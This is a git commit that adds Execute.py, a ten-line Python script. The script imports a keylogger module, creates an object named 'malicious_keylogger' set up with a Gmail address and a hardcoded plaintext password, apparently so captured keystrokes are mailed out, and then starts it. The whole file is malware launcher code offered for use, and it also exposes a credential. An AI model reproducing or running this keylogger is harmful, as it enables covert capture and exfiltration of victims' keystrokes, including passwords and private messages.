a763fd28a2880081e0bde040a1681b01080cab6e
neelgandhi108 <51883615+neelgandhi108@users.noreply.github.com>
2020-01-10 14:40:16 +0530

    Create Execute.py

---
+++ Execute.py
@@ -0,0 +1,10 @@
+import keylogger
+
+
+# Initialize / create keylogger
+
+malicious_keylogger = keylogger.KeyLogger(10, 'completekeyloggerproject@gmail.com', 'Fi63J3vjCyE3')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
